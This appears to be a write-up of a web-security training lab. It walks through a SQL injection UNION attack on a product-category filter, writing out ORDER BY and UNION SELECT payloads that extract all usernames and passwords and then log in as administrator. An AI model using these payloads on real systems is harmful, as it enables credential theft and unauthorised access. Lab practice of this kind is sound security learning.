**SQL Injection — Lab #5 SQL injection UNION attack, retrieving data from other tables**

<img width="1100" height="455" alt="image" src="https://github.com/user-attachments/assets/e0dbf235-d6e3-423f-98bc-031b9d4b7571" />

In this Lab Product Category is vulnerable to SQL injection attack.

There is a table called users which is hidden. That table contains two columns called username and password.

Goal of this Lab is to retrieves all usernames and passwords and login as administrator.

For performing SQLi UNION attack, we need to know two things.

1. We need to know the number of column in a Table.

2. We need to know the data type of the columns.
   
Lets start the Lab

<img width="1100" height="638" alt="image" src="https://github.com/user-attachments/assets/0f7c86cf-d96f-45b9-a171-7eaef83d03ac" />

As per Lab description Product Category is vulnerable to SQL injection attack.

Lets quickly validate

<img width="1100" height="271" alt="image" src="https://github.com/user-attachments/assets/74cefe00-2c90-4c84-a7dd-f7dcb7af139a" />

We got an error message.

<img width="1100" height="497" alt="image" src="https://github.com/user-attachments/assets/8d9395ee-c56e-48bf-b24d-d437f9a0c4ab" />

This time we don’t get any error.

**STEP 1>** Need to determine number of columns

***web-security-academy.net/filter?category=Gifts’ ORDER BY 1 --***

<img width="1100" height="531" alt="image" src="https://github.com/user-attachments/assets/e59b75e6-3e32-43ad-ad01-b6bdb02cf6b0" />

We don’t get any error. Its shorting by the Title alphabetically.

***web-security-academy.net/filter?category=Gifts’ ORDER BY 2 --***

<img width="1100" height="673" alt="image" src="https://github.com/user-attachments/assets/7f408a2f-1499-445d-b8fd-bd920b7cd893" />

Again, no error which is obvious.

We can understand that there are at least two columns. One for Title and one for Description.

***web-security-academy.net/filter?category=Gifts’ ORDER BY 3 --***

<img width="1100" height="261" alt="image" src="https://github.com/user-attachments/assets/08b7335a-3642-4d48-b378-6a6d9c086d17" />

This time we got an error. It means there are 2 columns.

**SETP 2>** Now we need to determine data types of the columns.

As learned in the last lab we can use UNION operator to determine the data types.

Our payload should look like this.

***web-security-academy.net/filter?category=gifts’ UNION SELECT ‘a’, NULL --***

<img width="1100" height="534" alt="image" src="https://github.com/user-attachments/assets/9f9763d6-02d2-423d-bfb2-74af82bedf67" />

No error, means 1st column has strings data type.

***web-security-academy.net/filter?category=gifts’ UNION SELECT NULL, ‘a’ --***

<img width="1100" height="604" alt="image" src="https://github.com/user-attachments/assets/ee467cea-a77c-4a3e-a569-18b72c4e182b" />

Again no error, means 2nd column has also strings data type.

Goal of this Lab is to retrieves all usernames and passwords and login as administrator.

Now, we can use UNION operator to find out the username and passwords.

So our query will look like this

***web-security-academy.net/filter?category=gifts’ UNION SELECT username, password FROM users --***

Lets verify

<img width="1100" height="717" alt="image" src="https://github.com/user-attachments/assets/d1e81fc3-d7c2-4f8e-992a-a959221daa90" />

We got the username and passwords of all the users on the account.

Lets login via administrator to solve the lab

administrator || c5b2rlxtdv6c6nk4x0fa

<img width="1100" height="423" alt="image" src="https://github.com/user-attachments/assets/d2876678-c4db-4194-aa79-3044b88b4a13" />

We have logged in as administrator and lab is solved.

Lets understand the logic

We determine that there are two columns in the table and both contains strings data type.

And in the Lab description it was informed that there is a table called users which also has two columns, username and password.

Users table is hidden to us but its available in the database.

UNION operator adds the output of the two queries.

***web-security-academy.net/filter?category=gifts’ UNION SELECT username, password FROM users --***

We know the product category is vulnerable to SQLi.

So, we are getting the output of the query ***SELECT username, password FROM users*** with the help of UNION operator.
